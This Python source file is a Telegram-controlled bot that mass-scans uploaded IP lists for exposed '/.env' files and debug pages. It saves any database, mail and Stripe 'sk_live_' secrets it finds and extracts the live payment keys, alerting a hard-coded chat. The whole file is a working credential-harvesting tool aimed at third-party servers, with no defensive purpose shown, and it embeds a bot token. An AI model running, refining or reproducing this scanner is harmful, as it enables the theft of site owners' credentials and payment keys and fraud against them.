import re
import os
import urllib3
import time
import requests
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, Bot
from telegram.ext import CommandHandler, Updater, CallbackContext, MessageHandler, Filters
import threading

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Telegram Bot Token
BOT_TOKEN = '6577491572:AAGqmyZRSNXPpOuyHSlk-2Juiy8RLJgK5Lg'
CHAT_ID = '6589065442'

# Statistics variables (using thread locks for safe updates)
ips_in_queue = 0
ips_scanned = 0
env_files_found = 0
debug_files_found = 0
sk_live_hits = 0

# Flag to stop the scan
stop_scan_flag = False

# Locks for thread safety
lock = threading.Lock()

# The bot logic and scanning class
class ENV:
    def send_telegram_message(self, chat_id, message, file_path=None):
        telegram_api_url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        params = {'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML'}
        try:
            if file_path:
                with open(file_path, 'rb') as file:
                    files = {'document': file}
                    response = requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument',
                                             params={'chat_id': chat_id},
                                             files=files)
            else:
                response = requests.get(telegram_api_url, params=params)
            response.raise_for_status()
        except Exception as e:
            print(f"Failed to send message: {e}")

    def sanitize_url(self, url):
        return url.replace('https://', '')

    def scan(self, url):
        global ips_scanned, env_files_found, debug_files_found, sk_live_hits
        rr = ''
        sanitized_url = self.sanitize_url(url)
        mch_env = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=', 'sk_live_', 'APP_ENV=']
        mch_debug = ['DB_HOST', 'MAIL_HOST', 'DB_CONNECTION', 'MAIL_USERNAME', 'sk_live_', 'APP_DEBUG']
        try:
            r_env = requests.get(f'https://{sanitized_url}/.env', verify=False, timeout=15, allow_redirects=False)
            r_debug = requests.post(f'https://{sanitized_url}', data={'debug': 'true'}, allow_redirects=False, verify=False, timeout=15)
            resp_env = r_env.text if r_env.status_code == 200 else ''
            resp_debug = r_debug.text if r_debug.status_code == 200 else ''
            
            if any((key in resp_env for key in mch_env)) or any((key in resp_debug for key in mch_debug)):
                rr = f'Found: https://{sanitized_url}'
                file_path = os.path.join('ENV_DEBUG', f'{sanitized_url}_env_debug.txt')
                with open(file_path, 'w', encoding='utf-8') as output:
                    output.write(f'ENV:\n{resp_env}\n\nDEBUG:\n{resp_debug}\n')
                if 'sk_live_' in resp_env or 'sk_live_' in resp_debug:
                    with open('sk.txt', 'a') as sk_file:
                        sk_file.write(f'URL: https://{sanitized_url}\n')
                        if 'sk_live_' in resp_env:
                            sk_file.write('From ENV:\n')
                            lin = resp_env.splitlines()
                            for x in lin:
                                if 'sk_live_' in x:
                                    sk_key = re.sub(f'.*sk_live_', 'sk_live_', x).replace('\"', '')
                                    sk_file.write(f'{sk_key}\n')
                                    self.send_telegram_message(CHAT_ID, f'SK HIT FOUND! URL: {sanitized_url}')
                                    with lock:
                                        sk_live_hits += 1
                        if 'sk_live_' in resp_debug:
                            sk_file.write('From DEBUG:\n')
                            lin = resp_debug.splitlines()
                            for x in lin:
                                if 'sk_live_' in x:
                                    sk_key = re.sub(f'.*sk_live_', 'sk_live_', x).replace('\"', '')
                                    sk_file.write(f'{sk_key}\n')
                                    self.send_telegram_message(CHAT_ID, f'SK HIT FOUND! URL: {sanitized_url}')
                                    with lock:
                                        sk_live_hits += 1
                        sk_file.write('\n')
                with lock:
                    env_files_found += 1
            else:
                rr = f'Not Found: https://{sanitized_url}/.env'
            with lock:
                ips_scanned += 1
            print(rr)
        except Exception:
            rr = f'Error in: https://{sanitized_url}/.env'
            print(rr)

# Function to handle file replies for /start_scan
def start_scan(update: Update, context: CallbackContext):
    global stop_scan_flag, ips_in_queue
    message = update.message
    
    # Check if this command is a reply to a file
    if message.reply_to_message and message.reply_to_message.document:
        # Download the file
        file_id = message.reply_to_message.document.file_id
        file = context.bot.get_file(file_id)
        file_path = file.download(custom_path='ips.txt')

        # Read IPs from the file
        with open(file_path, 'r') as ip_file:
            url_list = [line.strip() for line in ip_file if line.strip()]
        
        with lock:
            ips_in_queue = len(url_list)
        stop_scan_flag = False
        context.bot.send_message(chat_id=update.effective_chat.id, text=f"Starting scan. IPs in Queue: {ips_in_queue}")
        threading.Thread(target=run_scan, args=(url_list,)).start()
    else:
        context.bot.send_message(chat_id=update.effective_chat.id, text="Please reply to an IP file using /start_scan.")

def stop_scan(update: Update, context: CallbackContext):
    global stop_scan_flag
    stop_scan_flag = True
    context.bot.send_message(chat_id=update.effective_chat.id, text="Scan stopped.")

def stats(update: Update, context: CallbackContext):
    global ips_in_queue, ips_scanned, env_files_found, debug_files_found, sk_live_hits
    with lock:
        message = (
            f"IPs in Queue: {ips_in_queue}\n"
            f"No. of IPs Scanned: {ips_scanned}\n"
            f"ENV Files Found: {env_files_found}\n"
            f"Debug Files Found: {debug_files_found}\n"
            f"SK_LIVE Hits: {sk_live_hits}"
        )
    context.bot.send_message(chat_id=update.effective_chat.id, text=message)

# Periodic Stats Updates
def periodic_stats_updates(context: CallbackContext):
    global ips_in_queue, ips_scanned, env_files_found, debug_files_found, sk_live_hits
    with lock:
        message = (
            f"Current Stats:\n"
            f"IPs in Queue: {ips_in_queue}\n"
            f"No. of IPs Scanned: {ips_scanned}\n"
            f"ENV Files Found: {env_files_found}\n"
            f"Debug Files Found: {debug_files_found}\n"
            f"SK_LIVE Hits: {sk_live_hits}"
        )
    context.bot.send_message(chat_id=CHAT_ID, text=message)

# Function to run the scan
def run_scan(url_list):
    global stop_scan_flag
    with ThreadPoolExecutor(max_workers=10) as executor:
        for url in url_list:
            if stop_scan_flag:
                break
            executor.submit(ENV().scan, url)
            time.sleep(0.05)

# Function to handle file uploads (for information purposes)
def handle_document(update: Update, context: CallbackContext):
    context.bot.send_message(chat_id=update.effective_chat.id, text="File received. Reply with /start_scan to begin scanning.")

def main():
    updater = Updater(token=BOT_TOKEN, use_context=True)
    dispatcher = updater.dispatcher

    # Command Handlers
    dispatcher.add_handler(CommandHandler('start_scan', start_scan))
    dispatcher.add_handler(CommandHandler('stop_scan', stop_scan))
    dispatcher.add_handler(CommandHandler('stats', stats))
    
    # Add a job to send periodic stats updates every minute
    job_queue = updater.job_queue
    job_queue.run_repeating(periodic_stats_updates, interval=60, first=60)

    # Message Handler for documents
    dispatcher.add_handler(MessageHandler(Filters.document, handle_document))

    # Start the bot
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
